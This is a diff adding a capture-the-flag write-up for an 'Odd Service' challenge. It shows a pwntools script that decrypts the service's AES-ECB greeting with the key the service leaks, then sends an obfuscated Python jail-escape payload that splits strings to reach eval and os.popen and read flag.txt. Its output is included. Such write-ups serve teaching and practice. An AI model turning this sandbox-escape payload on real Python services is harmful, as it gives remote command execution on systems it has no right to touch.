@@ -299,3 +299,83 @@ Shellcode Output: DPCTF{SallySellsShellcodesOnTheSeashore}
 Error executing shellcode. Command '['/tmp/tmpt8uuz547/shellcode']' returned non-zero exit status 1.
 [*] Closed connection to pwn.ctf.ae port 1221
 ```
+
+# Odd Service
+
+This challenge was really Odd in serveral ways. So after connecting to the service it replies with some AES-256 encrypted string, and somehow, it provides the key. 
+
+```bash
+nc pwn.ctf.ae 1337
+Hi, please use base64 encoded AES-256-ECB using PKCS7 padding with a secret of 'sjoqkxKpsAgAuHosIitUSXLoDMfBDHGQ'.
+emoL/Sp/p4F0khEMfKKeaveeZfZRoXMNBHHuvZJomyc=
+```
+
+So first we have to know what is the value of what is it encrypting? that can be done also with pwntools. 
+
+```python
+from Crypto.Cipher import AES
+from base64 import b64encode,b64decode
+from pwn import *
+
+
+def pad(m):
+    return m+chr(16-len(m)%16)*(16-len(m)%16)
+p = remote("pwn.ctf.ae",1337)
+
+key = p.recv().split("'")[1]
+
+text = p.recv().strip()
+print(key,text)
+
+plaintext = b64decode(text)
+obj = AES.new(key, AES.MODE_ECB)
+ciphertext = obj.decrypt(plaintext)
+```
+
+Executing the script outputs **Hello, please send your input!**. Sending anything with the encryption key we were provided raises an error.** invalid syntax (<string>, line 1)**.
+
+So we have to somehow send a python code that can read flag.txt. After a bit of playing with the payload, it seems that this is a python jail. Luckly, pyjail can be easily bypassed. The following payload seems to be working. 
+
+```python
+payload = """__builtins__.__dict__['ev'+"al"]("__imp"+"ort__('o"+"s').po"+"pen('ls').read()")"""
+```
+So putting all of this together should acheive RCE. 
+
+```python
+from Crypto.Cipher import AES
+from base64 import b64encode,b64decode
+from pwn import *
+
+
+def pad(m):
+    return m+chr(16-len(m)%16)*(16-len(m)%16)
+p = remote("pwn.ctf.ae",1337)
+
+key = p.recv().split("'")[1]
+
+text = p.recv().strip()
+
+plaintext = b64decode(text)
+obj = AES.new(key, AES.MODE_ECB)
+ciphertext = obj.decrypt(plaintext)
+
+payload = """__builtins__.__dict__['ev'+"al"]("__imp"+"ort__('o"+"s').po"+"pen('cat flag.txt').read()")"""
+ciphertext = obj.encrypt(pad(payload))
+p.sendline(b64encode(ciphertext).decode())
+plaintext = b64decode(p.recv())
+ciphertext = obj.decrypt(pad(plaintext))
+
+print(ciphertext)
+```
+
+Executing the script should outputs the flag.
+
+```bash
+python solve.py 
+[+] Opening connection to pwn.ctf.ae on port 1337: Done
+DPCTF{3ncrypt3dDo3sntAlwaysM3anS3cur3}
+\x19\x19\x19\x19\x19\x19\x19\x19\x19\x19\x19\x19\x19O��B\x85+�O\x9b\xaa-Ĳ\xa1
+[*] Closed connection to pwn.ctf.ae port 1337
+
+```
+
